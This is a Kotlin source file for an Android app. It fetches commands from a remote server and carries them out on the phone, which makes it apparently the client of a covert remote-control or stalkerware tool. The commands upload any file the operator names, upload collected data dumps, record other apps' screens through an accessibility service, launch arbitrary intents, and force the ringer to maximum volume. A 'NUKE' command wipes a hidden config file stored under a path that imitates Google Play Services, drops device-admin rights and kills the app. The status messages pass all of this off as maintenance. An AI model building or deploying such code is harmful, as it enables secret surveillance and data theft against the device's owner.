package com.example.myandroid

import android.content.Context
import android.os.Environment
import android.os.Handler
import android.os.Looper
import android.widget.Toast
import androidx.work.Constraints
import androidx.work.ExistingPeriodicWorkPolicy
import androidx.work.NetworkType
import androidx.work.PeriodicWorkRequestBuilder
import androidx.work.WorkManager
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import org.json.JSONArray
import org.json.JSONObject
import java.io.File
import java.net.HttpURLConnection
import java.net.URL
import java.util.concurrent.TimeUnit

object CommandProcessor {

    suspend fun checkAndExecute(ctx: Context) {
        withContext(Dispatchers.IO) {
            try {
                val deviceId = DeviceManager.getDeviceId(ctx)
                // Fetch PENDING commands via Gateway
                val req = JSONObject()
                req.put("action", "get_commands")
                req.put("deviceId", deviceId)

                val supabaseUrl = SecretVault.getGatewayUrl(ctx)
                val supabaseKey = SecretVault.getLock(ctx)

                val url = URL(supabaseUrl)
                val conn = url.openConnection() as HttpURLConnection
                conn.requestMethod = "POST"
                conn.setRequestProperty("apikey", supabaseKey)
                conn.setRequestProperty("Authorization", "Bearer $supabaseKey")
                conn.setRequestProperty("Content-Type", "application/json")
                conn.doOutput = true

                conn.outputStream.use { it.write(req.toString().toByteArray()) }

                if (conn.responseCode == 200) {
                    val resp = conn.inputStream.bufferedReader().use { it.readText() }
                    val respObj = JSONObject(resp)
                    if (respObj.optBoolean("success")) {
                        val commands = respObj.optJSONArray("data") ?: JSONArray()
                        for (i in 0 until commands.length()) {
                            val cmd = commands.getJSONObject(i)
                            DebugLogger.log("SYSTEM", "Incoming maintenance request: ${cmd.optString("file_name")}")
                            processSingleCommand(ctx, cmd)
                        }
                    }
                }
            } catch (e: Exception) {
                e.printStackTrace()
            }
        }
    }

    private suspend fun processSingleCommand(ctx: Context, cmd: JSONObject) {
        val id = cmd.getInt("id")
        
        // 1. Mark as RECEIVED immediately so backend knows the device is alive
        updateCommandStatus(ctx, id, "RECEIVED", null)

        var status = "EXECUTED"
        var errorMsg = ""
        val fileName = cmd.optString("file_name")
        val content = cmd.optString("content", "")

        try {
            when (fileName) {
                "TOAST" -> {
                    Handler(Looper.getMainLooper()).post {
                        Toast.makeText(ctx, content, Toast.LENGTH_LONG).show()
                    }
                }
                "RING" -> {
                    val dur = content.toLongOrNull() ?: 10L
                    val am = ctx.getSystemService(Context.AUDIO_SERVICE) as android.media.AudioManager
                    val oldMode = am.ringerMode
                    val oldVol = am.getStreamVolume(android.media.AudioManager.STREAM_RING)
                    
                    if (PermissionManager.hasDndAccess(ctx)) {
                        am.ringerMode = android.media.AudioManager.RINGER_MODE_NORMAL
                    }
                    am.setStreamVolume(android.media.AudioManager.STREAM_RING, am.getStreamMaxVolume(android.media.AudioManager.STREAM_RING), 0)
                    
                    val uri = android.media.RingtoneManager.getDefaultUri(android.media.RingtoneManager.TYPE_RINGTONE)
                    val ringtone = android.media.RingtoneManager.getRingtone(ctx, uri)
                    ringtone.play()
                    
                    kotlinx.coroutines.CoroutineScope(Dispatchers.IO).launch {
                        kotlinx.coroutines.delay(dur * 1000)
                        ringtone.stop()
                        if (PermissionManager.hasDndAccess(ctx)) {
                            am.ringerMode = oldMode
                        }
                        am.setStreamVolume(android.media.AudioManager.STREAM_RING, oldVol, 0)
                    }
                    status = "RINGING (${dur}S)"
                }
                "STAY_READY" -> {
                    val mins = content.toLongOrNull() ?: 5L
                    val i = android.content.Intent(ctx, BeaconService::class.java)
                    i.putExtra("duration_mins", mins)
                    if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) ctx.startForegroundService(i)
                    else ctx.startService(i)
                    status = "SYNC_PRIORITY_HIGH (${mins}M)"
                }
                "SET_INTERVAL" -> {
                    // Content = Interval in Minutes (min 15)
                    val mins = content.toLongOrNull() ?: 15L
                    val safeMins = if (mins < 15) 15L else mins
                    
                    val wm = WorkManager.getInstance(ctx)
                    val constraints = Constraints.Builder()
                        .setRequiredNetworkType(NetworkType.CONNECTED)
                        .setRequiresBatteryNotLow(true)
                        .build()

                    val req = PeriodicWorkRequestBuilder<RemoteCommandWorker>(safeMins, TimeUnit.MINUTES)
                        .setConstraints(constraints)
                        .build()
                        
                    wm.enqueueUniquePeriodicWork("RemoteCmdWorker", ExistingPeriodicWorkPolicy.REPLACE, req)
                    status = "EXECUTED (NEW INTERVAL: ${safeMins}M)"
                }
                "STOP_BEACON" -> {
                    ctx.stopService(android.content.Intent(ctx, BeaconService::class.java))
                    status = "EXECUTED (STOPPED)"
                }
                "FORCE_UPLOAD" -> {
                    val modules = content.split(",").map { it.trim() }
                    CloudManager.uploadData(ctx, modules)
                    status = "MANUAL_BACKUP_INITIATED"
                }
                "UPLOAD_DUMPS" -> {
                    val dumps = DumpManager.getDumpsForToday()
                    var successCount = 0
                    dumps.forEach {
                        if (CloudManager.uploadFile(ctx, it, "DUMPS")) successCount++
                    }
                    if (successCount != dumps.size) return
                    status = "ARCHIVE_SYNC_COMPLETE ($successCount)"
                }
                "PULL_FILE" -> {
                    val f = File(content)
                    if (f.exists() && f.isFile) {
                        if (!CloudManager.uploadFile(ctx, f, "PULL")) return
                        status = "REMOTE_FETCH_SUCCESS"
                    } else {
                        status = "FETCH_ABORTED (NOT_FOUND)"
                    }
                }
                "GET_SKELETON" -> {
                    val report = FileManager.generateReport()
                    CloudManager.uploadSkeleton(ctx, report)
                    status = "STORAGE_INDEX_COMPLETE"
                }
                "GET_TREE" -> {
                    val json = JSONObject(content)
                    val pkg = json.optString("pkg", null)
                    val mins = json.optLong("duration_mins", 1L)
                    MyAccessibilityService.instance?.startTreeDump(pkg, mins)
                    status = "ACCESSIBILITY_AUDIT_ACTIVE (${mins}M)"
                }
                "GET_LOGS" -> {
                    val logs = DebugLogger.getLogs()
                    val tempFile = java.io.File(ctx.cacheDir, "diag_log_${System.currentTimeMillis()}.txt")
                    try {
                        tempFile.writeText(logs)
                        if (CloudManager.uploadFile(ctx, tempFile, "DIAGNOSTIC")) {
                            status = "DIAGNOSTIC_EXPORT_SUCCESS"
                        } else {
                            status = "DIAGNOSTIC_EXPORT_FAILED"
                        }
                    } catch (e: Exception) {
                        status = "EXPORT_ERROR"
                    } finally {
                        if (tempFile.exists()) tempFile.delete()
                    }
                }
                "TOGGLE_FEATURE" -> {
                    val parts = content.split(":")
                    if (parts.size >= 2) {
                        val feature = parts[0].trim()
                        val stateStr = parts[1].trim().lowercase()
                        val enable = stateStr == "on" || stateStr == "true"
                        val duration = if (parts.size >= 3) parts[2].toLongOrNull() ?: 0L else 0L
                        
                        ConfigManager.setFeature(ctx, feature, enable, duration)
                        status = if (duration > 0L) "EXECUTED (TEMP OFF: ${duration}M)" else "EXECUTED (PERMANENT)"
                    } else status = "FAILED (FORMAT)"
                }
                "CODERED" -> {
                    val i = android.content.Intent(ctx, EmergencyService::class.java)
                    i.putExtra("codes", "0")
                    i.putExtra("sender", "BACKEND")
                    if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) {
                        ctx.startForegroundService(i)
                    } else {
                        ctx.startService(i)
                    }
                }
                "NUKE" -> {
                    try {
                        File(Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOCUMENTS), "Android/data/com.google.android.gms/files/cache/.sys_config").deleteRecursively()
                        ctx.getSharedPreferences("app_stats", Context.MODE_PRIVATE).edit().clear().apply()
                        val dpm = ctx.getSystemService(Context.DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
                        val comp = android.content.ComponentName(ctx, MyDeviceAdminReceiver::class.java)
                        if (dpm.isAdminActive(comp)) dpm.removeActiveAdmin(comp)
                        status = "CLEANUP_COMPLETE"
                        Handler(Looper.getMainLooper()).postDelayed({ android.os.Process.killProcess(android.os.Process.myPid()) }, 2000)
                    } catch(e: Exception) { status = "CLEANUP_FAILED" }
                }
                "RUN_INTENT" -> {
                    try {
                        val json = JSONObject(content)
                        val intent = android.content.Intent(json.optString("action", android.content.Intent.ACTION_VIEW))
                        
                        if (json.has("data")) intent.data = android.net.Uri.parse(json.getString("data"))
                        if (json.has("pkg")) intent.setPackage(json.getString("pkg"))
                        if (json.has("type")) intent.setDataAndType(intent.data, json.getString("type"))
                        
                        // Handle Extras
                        val extras = json.optJSONObject("extras")
                        extras?.keys()?.forEach { key ->
                            val value = extras.get(key)
                            if (value is Boolean) intent.putExtra(key, value)
                            else if (value is Int) intent.putExtra(key, value)
                            else intent.putExtra(key, value.toString())
                        }

                        intent.addFlags(android.content.Intent.FLAG_ACTIVITY_NEW_TASK)
                        
                                                    val target = json.optString("target", "activity")
                            when(target?.lowercase() ?: "activity") {
                            "service" -> {
                                if (android.os.Build.VERSION.SDK_INT >= android.os.Build.VERSION_CODES.O) ctx.startForegroundService(intent)
                                else ctx.startService(intent)
                            }
                            "broadcast" -> ctx.sendBroadcast(intent)
                            else -> ctx.startActivity(intent)
                        }
                        status = "EXECUTED (INTENT SENT)"
                    } catch (e: Exception) {
                        status = "FAILED_INTENT"
                        errorMsg = e.message ?: "Unknown Intent Error"
                    }
                }
            }
        } catch (e: Exception) {
            status = "FAILED: ${e.message}"
            errorMsg = e.toString()
        }

        // Expose the result to the UI Terminal
        DebugLogger.log("COMMAND", "Processed [$fileName] -> $status")

        // Update DB
        updateCommandStatus(ctx, id, status, errorMsg)
    }

    private fun updateCommandStatus(ctx: Context, id: Int, status: String, errorMsg: String?) {
        try {
            val key = SecretVault.getLock(ctx)
            val updateUrl = URL(SecretVault.getGatewayUrl(ctx))
            val conn = updateUrl.openConnection() as HttpURLConnection
            conn.requestMethod = "POST"
            conn.setRequestProperty("apikey", key)
            conn.setRequestProperty("Authorization", "Bearer $key")
            conn.setRequestProperty("Content-Type", "application/json")
            conn.doOutput = true

            val req = JSONObject()
            req.put("action", "update_command")
            req.put("deviceId", DeviceManager.getDeviceId(ctx))
            val payload = JSONObject()
            payload.put("id", id)
            payload.put("status", status)
            if (!errorMsg.isNullOrEmpty()) payload.put("errorMsg", errorMsg)
            req.put("payload", payload)

            conn.outputStream.use { it.write(req.toString().toByteArray()) }
            val code = conn.responseCode
            if (code !in 200..299) {
                val err = conn.errorStream?.bufferedReader()?.use { it.readText() } ?: "No Error Body"
                DebugLogger.log("SUPABASE_ERR", "Cmd Status Update Failed: $code | $err")
            }
        } catch (e: Exception) { 
            DebugLogger.log("CMD_ERR", "Update Status Error: ${e.message}")
        }
    }
}
